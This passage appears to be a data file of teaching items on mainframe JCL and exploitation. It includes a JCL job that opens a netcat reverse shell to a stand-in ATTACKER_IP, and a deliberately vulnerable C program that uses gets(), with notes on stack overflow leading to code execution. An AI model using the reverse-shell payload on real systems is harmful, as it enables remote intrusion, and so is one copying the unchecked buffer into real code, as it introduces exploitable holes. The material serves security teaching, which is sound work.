Payload: reverse_shell_jcl

//RSHELL   JOB (ACCT),'SHELL',CLASS=A,MSGCLASS=X,
//         NOTIFY=&SYSUID
//STEP1    EXEC PGM=BPXBATCH
//STDOUT   DD SYSOUT=*
//STDERR   DD SYSOUT=*
//STDPARM  DD *
SH nc -e /bin/sh ATTACKER_IP 4444
/*", 'expected': 'Understand the structure of the JCL reverse shell payload.', 'hint': 'BPXBATCH executes Unix System Services (USS) shell commands from batch JCL.'}

To begin:

{'title': 'What is JCL?', 'screen': "Job Control Language (JCL)

//MYJOB   JOB (ACCT),'MY JOB',CLASS=A,MSGCLASS=X
//STEP1   EXEC PGM=IEFBR14
//SYSPRINT DD  SYSOUT=*

JCL defines: who runs it, what program, what data.", 'expected': 'Understand the three parts of a JCL job: JOB, EXEC, DD.', 'hint': 'JOB card = identity + accounting. EXEC = program to run. DD = data definition.'}

To begin:

{'title': 'JCL Review', 'screen': "//DEMOJOB JOB (ACCT),'DEMO'
//STEP1 EXEC PGM=IEBGENER
//SYSUT1 DD DSN=PROD.DATA.FILE,DISP=SHR
//SYSUT2 DD DSN=TEST.DATA.FILE,DISP=(NEW,CATLG,DELETE)", 'expected': 'Identify the job, step, and datasets referenced.', 'hint': 'Look for JOB, EXEC, and DD statements.'}

To begin:

{'title': 'The Vulnerable Program', 'screen': '/* hello.c — deliberately vulnerable */
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv) {
   char buff[150];          /* fixed-size stack buffer */
   printf("What is your handle?\n");
   gets(buff);              /* NO BOUNDS CHECK — classic vuln */
   printf("Wake up, %s\n", buff);
   return 0;
}

The overflow:
  buff is 150 bytes on the stack
  gets() reads until newline — no limit
  Feed > 150 bytes → overwrite return address
  Control where the function returns → RCE', 'expected': 'Understand why gets() is dangerous and how a stack overflow works.', 'hint': 'gets() is banned in modern C (removed in C11). On MVS/370 the stack is in the same address space as program code — overflowing it overwrites the return address stored by STM (Store Multiple Registers).'}

